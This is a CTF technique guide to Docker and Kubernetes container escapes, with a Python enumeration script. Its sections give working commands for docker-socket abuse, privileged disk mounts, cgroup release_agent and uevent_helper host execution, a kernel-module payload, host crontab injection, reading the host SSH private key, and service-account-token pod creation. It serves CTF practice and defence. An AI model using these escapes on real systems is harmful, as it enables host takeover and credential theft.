---
title: "Container Escape in CTF"
category: misc
subcategory: container
type: technique
tags: [docker, container-escape, privileged, release-agent, cgroups, docker-socket, capabilities, cap-sys-admin, cap-dac-read-search, shocker, uevent-helper, hostpath, kubernetes, service-account-token, namespaces]
difficulty: hard
summary: "Detect the container, enumerate capabilities and mounts, then pick the matching escape: privileged, docker.sock, a dangerous capability, or a host mount."
when_to_use:
  - "You have RCE inside a container and the flag is on the host"
  - "/.dockerenv exists or /proc/1/cgroup mentions docker/kubepods"
  - "docker.sock is mounted, or the container was started with --privileged"
  - "getpcaps/capsh shows CAP_SYS_ADMIN, CAP_SYS_MODULE or CAP_DAC_READ_SEARCH"
tools: [capsh, getpcaps, mount, findmnt, nsenter, docker, kubectl, python3, fdisk]
related: [linux-privesc, shell-jail-escape, gtfobins-quickref, misc-classics, hunt-k8s]
---

## TL;DR

Escapes come from four sources, in decreasing frequency: a **mounted docker socket**, a
**`--privileged` container**, a **dangerous capability** (SYS_ADMIN, DAC_READ_SEARCH,
SYS_MODULE, SYS_PTRACE with a shared PID namespace), and a **host path mounted inside**. Spend
two minutes enumerating; the enumeration tells you which one you have.

## Recognise it

```bash
# am I in a container?
ls -la /.dockerenv /run/.containerenv 2>/dev/null
cat /proc/1/cgroup                 # docker/ kubepods/ containerd/ in the paths (cgroup v1)
cat /proc/self/mountinfo | head    # overlay / overlay2 as the root filesystem
hostname                           # a 12-hex-char hostname is a docker default
cat /proc/1/sched | head -1        # PID 1 is not systemd/init
ls /proc/1/root 2>/dev/null        # permission denied unless privileged
systemd-detect-virt -c             # prints docker/lxc/podman when containerised
```

```bash
# what am I allowed to do?
id; capsh --print
grep Cap /proc/self/status         # CapEff is the one that matters
cat /proc/self/status | grep -i seccomp    # Seccomp: 0 = none, 2 = filtered
mount | grep -Ei 'docker|kube|host|proc|sys'
findmnt
ls -la /var/run/docker.sock /run/docker.sock
ls /dev                            # a privileged container sees the host's block devices
cat /proc/self/uid_map             # 0 0 4294967295 -> not user-namespaced
```

`CapEff=0000003fffffffff` (all bits set) means `--privileged`.
`CapEff=00000000a80425fb` is the Docker default capability set.

## Escapes

### 1. Mounted docker socket

The most common CTF escape. If you can talk to `/var/run/docker.sock` you are root on the host.

```bash
# with the docker client
docker -H unix:///var/run/docker.sock ps
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host sh

# without the client, over raw HTTP
curl -s --unix-socket /var/run/docker.sock http://localhost/version
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
curl -s -XPOST --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/root/flag.txt"],
       "HostConfig":{"Binds":["/:/host"]}}' \
  http://localhost/containers/create
curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<id>/start
curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/<id>/logs?stdout=1"
```

### 2. Privileged container -> mount the host disk

```bash
# find the host's root filesystem device
fdisk -l
lsblk
cat /proc/partitions
# mount it
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && ls /mnt/host
chroot /mnt/host sh
```

### 3. Privileged container -> cgroup v1 `release_agent`

Works when you have CAP_SYS_ADMIN and cgroup **v1** is available (kernel calls the
release_agent binary on the host when the last task leaves a cgroup).

```bash
# 1. mount an RDMA (or any unused) cgroup v1 controller
mkdir -p /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir -p /tmp/cgrp/x

# 2. enable notify_on_release for our child cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# 3. the release_agent path is interpreted on the HOST, so we need the overlay upperdir
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 4. write the payload where the host will find it
cat > /cmd <<'EOF'
#!/bin/sh
cat /root/flag.txt > /output
EOF
chmod +x /cmd

# 5. trigger: put a process into the cgroup and let it exit
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1; cat /output
```

Note: this requires cgroup **v1**. On a cgroup v2-only host (`stat -fc %T /sys/fs/cgroup` says
`cgroup2fs`) it does not apply - use the disk mount or `/sys/kernel/uevent_helper` instead.

### 4. `/sys/kernel/uevent_helper` (needs a writable sysfs, i.e. privileged)

```bash
host_path=$(sed -n 's/.*\bupperdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/payload" > /sys/kernel/uevent_helper
cat > /payload <<'EOF'
#!/bin/sh
cp /root/flag.txt /output
EOF
chmod +x /payload
echo change > /sys/class/mem/null/uevent      # trigger a uevent
cat /output
```

### 5. Capability-specific

| Capability | Escape |
| --- | --- |
| `CAP_SYS_ADMIN` | mount host filesystems; cgroup release_agent; `unshare` tricks |
| `CAP_DAC_READ_SEARCH` | `open_by_handle_at` brute force ("shocker") reads any host file |
| `CAP_SYS_MODULE` | `insmod` a kernel module -> full host code execution |
| `CAP_SYS_PTRACE` + `--pid=host` | inject shellcode into a host process |
| `CAP_SYS_RAWIO` | `/dev/mem`, `/dev/port` access |
| `CAP_NET_RAW` | sniff and spoof on the container network (lateral, not escape) |
| `CAP_SYS_BOOT` | reboot the host (denial of service only) |

```bash
# CAP_SYS_MODULE
cat > /tmp/reverse.c <<'EOF'
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
static int __init m_init(void) {
    char *argv[] = {"/bin/bash","-c","cp /root/flag.txt /tmp/out; chmod 666 /tmp/out",NULL};
    static char *envp[] = {"HOME=/","PATH=/sbin:/bin:/usr/sbin:/usr/bin",NULL};
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit m_exit(void) {}
module_init(m_init); module_exit(m_exit);
EOF
# build with a matching kernel headers tree, then: insmod reverse.ko

# CAP_SYS_PTRACE with --pid=host
ps aux                      # you can see host processes
# attach with gdb and call system(), or inject shellcode
```

### 6. Host path mounts

```bash
mount | grep -v overlay | grep -E '^/dev|host'
# the classic wins:
ls /host /hostfs /mnt/host 2>/dev/null
ls /var/run/docker.sock /var/run/crio/crio.sock /run/containerd/containerd.sock
# a writable /etc or /root of the host: add a cron job or an SSH key
echo '* * * * * root cp /root/flag.txt /tmp/f; chmod 666 /tmp/f' >> /host/etc/crontab
cat /host/root/.ssh/id_rsa
```

### 7. Shared namespaces

```bash
# --pid=host: you see the host's processes and /proc/<pid>/root is the host filesystem
ls /proc/1/root/root/
cat /proc/1/environ | tr '\0' '\n'
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# --net=host: the host's loopback is reachable, including services bound to 127.0.0.1
ss -lntp; curl http://127.0.0.1:2375/version        # an unauthenticated docker API
```

### 8. Kubernetes specifics

```bash
# the service account token is mounted into every pod by default
ls /var/run/secrets/kubernetes.io/serviceaccount/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NS/pods
# can I create a privileged pod?
kubectl auth can-i --list
kubectl run p --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"p",
 "image":"alpine","securityContext":{"privileged":true},"command":["nsenter","--target","1",
 "--mount","--uts","--ipc","--net","--pid","--","bash"],"stdin":true,"tty":true}]}}' -it
# the kubelet read-only API, when exposed
curl -sk https://NODE_IP:10250/pods
```

## Code

```python
#!/usr/bin/env python3
"""Container enumeration: are we contained, with what capabilities, and which escape applies.

  python3 container_enum.py
  python3 container_enum.py --selftest
"""
from __future__ import annotations

import os
import sys

# Linux capability names indexed by bit position (cap value).
CAP_NAMES = [
    "CAP_CHOWN", "CAP_DAC_OVERRIDE", "CAP_DAC_READ_SEARCH", "CAP_FOWNER", "CAP_FSETID",
    "CAP_KILL", "CAP_SETGID", "CAP_SETUID", "CAP_SETPCAP", "CAP_LINUX_IMMUTABLE",
    "CAP_NET_BIND_SERVICE", "CAP_NET_BROADCAST", "CAP_NET_ADMIN", "CAP_NET_RAW",
    "CAP_IPC_LOCK", "CAP_IPC_OWNER", "CAP_SYS_MODULE", "CAP_SYS_RAWIO", "CAP_SYS_CHROOT",
    "CAP_SYS_PTRACE", "CAP_SYS_PACCT", "CAP_SYS_ADMIN", "CAP_SYS_BOOT", "CAP_SYS_NICE",
    "CAP_SYS_RESOURCE", "CAP_SYS_TIME", "CAP_SYS_TTY_CONFIG", "CAP_MKNOD", "CAP_LEASE",
    "CAP_AUDIT_WRITE", "CAP_AUDIT_CONTROL", "CAP_SETFCAP", "CAP_MAC_OVERRIDE",
    "CAP_MAC_ADMIN", "CAP_SYSLOG", "CAP_WAKE_ALARM", "CAP_BLOCK_SUSPEND", "CAP_AUDIT_READ",
    "CAP_PERFMON", "CAP_BPF", "CAP_CHECKPOINT_RESTORE",
]

DANGEROUS = {
    "CAP_SYS_ADMIN": "mount host filesystems; cgroup v1 release_agent escape",
    "CAP_SYS_MODULE": "insmod a kernel module -> arbitrary host code execution",
    "CAP_DAC_READ_SEARCH": "open_by_handle_at (shocker) reads any file on the host",
    "CAP_SYS_PTRACE": "with a shared PID namespace, inject into a host process",
    "CAP_SYS_RAWIO": "/dev/mem and /dev/port access",
    "CAP_SYS_BOOT": "reboot the host",
    "CAP_NET_ADMIN": "reconfigure the container network (lateral movement)",
    "CAP_MKNOD": "create device nodes -> reach the host's block devices",
}

SOCKETS = [
    "/var/run/docker.sock", "/run/docker.sock",
    "/run/containerd/containerd.sock", "/var/run/crio/crio.sock",
    "/var/run/podman/podman.sock",
]

DOCKER_DEFAULT_CAPS = 0x00000000A80425FB


def decode_caps(hexval: str) -> list[str]:
    """Turn a /proc/self/status CapEff hex string into capability names."""
    value = int(hexval, 16)
    return [name for i, name in enumerate(CAP_NAMES) if value & (1 << i)]


def read_status_caps(path: str = "/proc/self/status") -> dict[str, str]:
    out: dict[str, str] = {}
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                if line.startswith("Cap") or line.startswith("Seccomp") or line.startswith("NoNewPrivs"):
                    k, _, v = line.partition(":")
                    out[k.strip()] = v.strip()
    except OSError:
        pass
    return out


def is_container() -> list[str]:
    signals: list[str] = []
    if os.path.exists("/.dockerenv"):
        signals.append("/.dockerenv exists (docker)")
    if os.path.exists("/run/.containerenv"):
        signals.append("/run/.containerenv exists (podman)")
    try:
        with open("/proc/1/cgroup", encoding="utf-8", errors="replace") as fh:
            cg = fh.read()
        for token in ("docker", "kubepods", "containerd", "lxc", "libpod", "garden"):
            if token in cg:
                signals.append(f"/proc/1/cgroup mentions {token}")
    except OSError:
        pass
    try:
        with open("/proc/self/mountinfo", encoding="utf-8", errors="replace") as fh:
            mi = fh.read()
        if "overlay" in mi:
            signals.append("root filesystem is an overlay mount")
    except OSError:
        pass
    host = os.uname().nodename
    if len(host) == 12 and all(c in "0123456789abcdef" for c in host):
        signals.append(f"hostname {host} looks like a docker container id")
    return signals


def interesting_mounts(path: str = "/proc/self/mountinfo") -> list[str]:
    out: list[str] = []
    try:
        with open(path, encoding="utf-8", errors="replace") as fh:
            lines = fh.read().splitlines()
    except OSError:
        return out
    for line in lines:
        parts = line.split()
        if len(parts) < 5:
            continue
        root, mountpoint = parts[3], parts[4]
        rw = "rw" in parts[5].split(",") if len(parts) > 5 else False
        if mountpoint in ("/", "/proc", "/sys", "/dev", "/dev/pts", "/dev/shm",
                          "/proc/sys", "/sys/fs/cgroup"):
            continue
        if root != "/" or mountpoint.startswith(("/host", "/mnt", "/media")):
            out.append(f"{mountpoint} (host path {root}, {'rw' if rw else 'ro'})")
    return out


def analyse(status: dict[str, str], signals: list[str], sockets: list[str],
            mounts: list[str], cgroup_v2: bool) -> list[str]:
    findings: list[str] = []
    cap_eff = status.get("CapEff", "")
    caps = decode_caps(cap_eff) if cap_eff else []
    val = int(cap_eff, 16) if cap_eff else 0

    if val and bin(val).count("1") >= 35:
        findings.append("!! ALL capabilities are effective -> --privileged container")
        findings.append("   -> mount the host disk: fdisk -l; mount /dev/sda1 /mnt; chroot /mnt sh")
        if not cgroup_v2:
            findings.append("   -> cgroup v1 present: the release_agent escape applies")
        else:
            findings.append("   -> cgroup v2 only: release_agent does NOT apply, use the disk mount")
    elif val == DOCKER_DEFAULT_CAPS:
        findings.append("capability set matches the docker default (no extra capabilities)")

    for c in caps:
        if c in DANGEROUS:
            findings.append(f"!! {c}: {DANGEROUS[c]}")

    for s in sockets:
        findings.append(f"!! container runtime socket reachable: {s} -> "
                        f"docker -H unix://{s} run -v /:/host -it alpine chroot /host sh")

    for m in mounts:
        findings.append(f"!! host path mounted: {m}")

    if status.get("Seccomp") == "0":
        findings.append("seccomp is DISABLED (--security-opt seccomp=unconfined)")

    if not findings and signals:
        findings.append("contained, but no obvious escape primitive - look for a kernel "
                        "exploit, a shared namespace (--pid=host), or a credential on disk")
    return findings


def main() -> int:
    signals = is_container()
    print("== containment signals ==")
    for s in signals or ["(none: this may be the host)"]:
        print("  " + s)

    status = read_status_caps()
    print("\n== capabilities ==")
    for k, v in status.items():
        print(f"  {k}: {v}")
    if "CapEff" in status:
        eff = decode_caps(status["CapEff"])
        print("  effective: " + (", ".join(eff) if eff else "(none)"))

    sockets = [s for s in SOCKETS if os.path.exists(s)]
    mounts = interesting_mounts()
    cgroup_v2 = os.path.exists("/sys/fs/cgroup/cgroup.controllers")

    print("\n== findings ==")
    for f in analyse(status, signals, sockets, mounts, cgroup_v2):
        print("  " + f)
    return 0


def _selftest() -> None:
    # capability decoding
    assert decode_caps("0000000000000001") == ["CAP_CHOWN"]
    assert "CAP_SYS_ADMIN" in decode_caps("0000000000200000")
    assert decode_caps("0000000000000000") == []
    priv = decode_caps("000001ffffffffff")
    assert "CAP_SYS_ADMIN" in priv and "CAP_SYS_MODULE" in priv and len(priv) == 41, len(priv)
    default = decode_caps(f"{DOCKER_DEFAULT_CAPS:016x}")
    assert "CAP_SYS_ADMIN" not in default, default
    assert "CAP_NET_RAW" in default and "CAP_CHOWN" in default, default

    # analysis of a privileged container
    findings = analyse({"CapEff": "000001ffffffffff", "Seccomp": "0"},
                       ["/.dockerenv exists (docker)"], [], [], cgroup_v2=False)
    assert any("privileged" in f for f in findings), findings
    assert any("release_agent" in f for f in findings), findings
    assert any("seccomp is DISABLED" in f for f in findings), findings

    # cgroup v2 changes the advice
    findings2 = analyse({"CapEff": "000001ffffffffff"}, [], [], [], cgroup_v2=True)
    assert any("does NOT apply" in f for f in findings2), findings2

    # a docker socket beats everything
    findings3 = analyse({"CapEff": f"{DOCKER_DEFAULT_CAPS:016x}"}, [],
                        ["/var/run/docker.sock"], [], cgroup_v2=True)
    assert any("docker.sock" in f and "chroot /host" in f for f in findings3), findings3

    # a single dangerous capability
    findings4 = analyse({"CapEff": "0000000000000004"}, [], [], [], cgroup_v2=True)
    assert any("CAP_DAC_READ_SEARCH" in f for f in findings4), findings4

    # mountinfo parsing on a synthetic file
    import tempfile
    mi = ("36 35 0:31 / /proc rw,nosuid,nodev,noexec shared:5 - proc proc rw\n"
          "41 35 8:1 /var/lib/x /host rw,relatime shared:1 - ext4 /dev/sda1 rw\n"
          "45 35 0:44 / / rw,relatime - overlay overlay rw,lowerdir=/a,upperdir=/b\n")
    with tempfile.NamedTemporaryFile("w", delete=False) as fh:
        fh.write(mi)
        path = fh.name
    mounts = interesting_mounts(path)
    os.unlink(path)
    assert any("/host" in m and "/var/lib/x" in m for m in mounts), mounts

    # status parsing
    with tempfile.NamedTemporaryFile("w", delete=False) as fh:
        fh.write("Name:\tsh\nCapEff:\t0000003fffffffff\nSeccomp:\t2\nNoNewPrivs:\t0\n")
        spath = fh.name
    st = read_status_caps(spath)
    os.unlink(spath)
    assert st["CapEff"] == "0000003fffffffff" and st["Seccomp"] == "2", st

    print(f"selftest ok: {len(priv)} caps decoded for privileged, docker default "
          f"({len(default)} caps) recognised, mountinfo + status parsed, 4 analyses")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--selftest":
        _selftest()
    else:
        sys.exit(main())
```

## Variants and pitfalls

- **Enumerate before you exploit.** Two minutes of `capsh --print`, `mount` and
  `ls /var/run/docker.sock` saves an hour of trying the wrong escape.
- **`release_agent` is cgroup v1 only.** Most modern distributions are cgroup v2 by default
  (`stat -fc %T /sys/fs/cgroup` -> `cgroup2fs`), where the technique simply does not exist.
- **The `upperdir` trick** is needed because paths you write inside the container are not the
  paths the host kernel sees. `sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /etc/mtab` gives you the
  host-side path of the container's writable layer.
- **`--privileged` is not the same as "all capabilities".** It also disables seccomp/AppArmor
  and gives full `/dev` access; a container can have `CAP_SYS_ADMIN` alone and still be
  confined by seccomp.
- **Seccomp blocks `mount`** in the default Docker profile, so `CAP_SYS_ADMIN` without
  `--security-opt seccomp=unconfined` is much less useful than it looks.
- **User namespaces** (`/proc/self/uid_map` not starting `0 0`) mean your "root" is not host
  root and most escapes fail.
- **In Kubernetes** the service account token is the usual path, not a kernel trick. Check
  `kubectl auth can-i --list` first.
- **Read-only bind mounts still leak data.** A read-only `/host/etc` is a full host
  configuration dump.
- **Do not reboot or break things.** `CAP_SYS_BOOT` and kernel modules can kill the challenge
  instance for everyone.
- **The flag may not be on the host at all.** Check whether the challenge really wants an
  escape before spending the time.

## Tools

`capsh`/`getpcaps` (libcap), `mount`/`findmnt`, `nsenter`, `fdisk`/`lsblk`, `curl --unix-socket`,
`docker` CLI, `kubectl`, `deepce` and `amicontained` for automated enumeration.

## References

- Linux `capabilities(7)` manual page for the capability list and bit numbering.
- Docker documentation for `--privileged`, `--cap-add`, and the default capability set.
- Kubernetes documentation for service account tokens mounted at
  `/var/run/secrets/kubernetes.io/serviceaccount/`.
- The Linux kernel cgroup v1 documentation for `notify_on_release` and `release_agent`.
